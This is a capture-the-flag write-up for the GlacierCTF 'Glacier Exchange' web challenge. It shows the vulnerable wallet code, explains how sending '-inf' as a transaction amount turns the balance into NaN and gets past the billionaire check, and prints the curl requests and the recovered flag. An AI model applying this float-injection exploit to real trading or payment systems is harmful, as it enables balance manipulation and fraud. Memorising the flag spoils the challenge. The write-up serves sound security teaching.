# Glacier Exchange [241 Solves]

## Description

> We have launched a new revolutionary exchange tool, allowing you to trade on the market and hanging out with your rich friends in the Glacier Club. Only Billionaires can get in though. Can you help me hang out with lEon sMuk?
>
> authors: hweissi & xsskevin
>
> <https://glacierexchange.web.glacierctf.com>
>
> Attachments: glacier_exchange.zip

<details><summary>Attachment file tree</summary>

```console
$ unzip -t glacier_exchange.zip
Archive:  glacier_exchange.zip
    testing: chall/                   OK
    testing: chall/assets/            OK
    testing: chall/assets/styles/     OK
    testing: chall/assets/styles/main.css   OK
    testing: chall/assets/images/     OK
    testing: chall/assets/images/bg.jpg   OK
    testing: chall/assets/images/convert-button.jpg   OK
    testing: chall/assets/icons/      OK
    testing: chall/assets/icons/smtl.png   OK
    testing: chall/assets/icons/glaciercoin.png   OK
    testing: chall/assets/icons/cashout.png   OK
    testing: chall/assets/icons/gamestock.png   OK
    testing: chall/assets/icons/favicon.ico   OK
    testing: chall/assets/icons/doge.png   OK
    testing: chall/assets/icons/ycmi.png   OK
    testing: chall/assets/icons/ascoin.png   OK
    testing: chall/assets/scripts/    OK
    testing: chall/assets/scripts/chart.component.js   OK
    testing: chall/assets/scripts/index.js   OK
    testing: chall/templates/         OK
    testing: chall/templates/index.html   OK
    testing: chall/src/               OK
    testing: chall/src/wallet.py      OK
    testing: chall/src/coin_api.py    OK
    testing: chall/requirements.txt   OK
    testing: chall/server.py          OK
No errors detected in compressed data of glacier_exchange.zip.
```

</details>

## Flag

gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2}

## Solution

The vulnerable API endpoint is [POST] /api/wallet/transaction.

```python
# chall/server.py

# (snip)

@app.route('/api/wallet/transaction', methods=['POST'])
def transaction():
    payload = request.json
    status = 0
    if "sourceCoin" in payload and "targetCoin" in payload and "balance" in payload:
        wallet = get_wallet_from_session()
        status = wallet.transaction(payload["sourceCoin"], payload["targetCoin"], float(payload["balance"]))  # [1]
    return jsonify({
        "result": status
    })

# (snip)
```

```python
# chall/src/wallet.py
import threading


class Wallet():
    def __init__(self) -> None:
        self.balances = {
            "cashout": 1000,  # [2]
            "glaciercoin": 0,
            "ascoin": 0,
            "doge": 0,
            "gamestock": 0,
            "ycmi": 0,
            "smtl": 0
        }
        self.lock = threading.Lock();


    def getBalances(self):
        return self.balances
    
    def transaction(self, source, dest, amount):
        if source in self.balances and dest in self.balances:
            with self.lock:
                if self.balances[source] >= amount:  # [3]
                    self.balances[source] -= amount
                    self.balances[dest] += amount
                    return 1
        return 0
    
    def inGlacierClub(self):
        with self.lock:
            for balance_name in self.balances:
                if balance_name == "cashout":
                    if self.balances[balance_name] < 1000000000:
                        return False
                else:
                    if self.balances[balance_name] != 0.0:
                        return False
            return True
```

- The `float()` function is used for the `balance` parameter [1].
  This implies the ability to create objects such as `float('inf')`, `float('-inf')` or `float('nan')`.

- `sourceCoin` and `targetCoin` can be set to the same value.

- The initial value for `cashout` is 1000 [2].
  If `-inf` is input for `balance`, the `transaction()` method is executed, and calculate for `amount` [3].
  Testing in Python Console due to confirm the operation of `transaction()` method:

  ```python
  >>> balance = 1000
  >>> balance >= float('-inf')
  True
  >>> balance -= float('-inf'); print(balance)
  inf
  >>> balance += float('-inf'); print(balance)
  nan
  >>> balance < 1000000000  # confirmation for inGlacierClub() 
  False
  ```

Thus, `inGlacierClub()` returns True.

```console
$ curl -D- --cookie-jar cookies.txt https://glacierexchange.web.glacierctf.com/api/wallet/transaction -H 'Content-Type: application/json' -d '{"sourceCoin":"cashout", "targetCoin":"cashout", "balance": "-inf"}'
HTTP/2 200
date: Mon, 27 Nov 2023 04:15:59 GMT
content-type: application/json
content-length: 13
vary: Cookie
set-cookie: session=eyJpZCI6InpqNmw3ZjAwdGZxQmFZX096bngyTlEifQ.ZWQX_w.h-yqkMhwCzlxdQ576ApoNAQo3qQ; HttpOnly; Path=/
strict-transport-security: max-age=15724800; includeSubDomains

{"result":1}

$ curl -D- --cookie cookies.txt https://glacierexchange.web.glacierctf.com/api/wallet/balances
HTTP/2 200
date: Mon, 27 Nov 2023 04:16:15 GMT
content-type: application/json
content-length: 203
vary: Cookie
strict-transport-security: max-age=15724800; includeSubDomains

[{"name":"cashout","value":NaN},{"name":"glaciercoin","value":0},{"name":"ascoin","value":0},{"name":"doge","value":0},{"name":"gamestock","value":0},{"name":"ycmi","value":0},{"name":"smtl","value":0}]

$ curl -D- --cookie cookies.txt https://glacierexchange.web.glacierctf.com/api/wallet/join_glacier_club -X POST
HTTP/2 200
date: Mon, 27 Nov 2023 04:16:35 GMT
content-type: application/json
content-length: 70
vary: Cookie
strict-transport-security: max-age=15724800; includeSubDomains

{"clubToken":"gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2}","inClub":true}
```
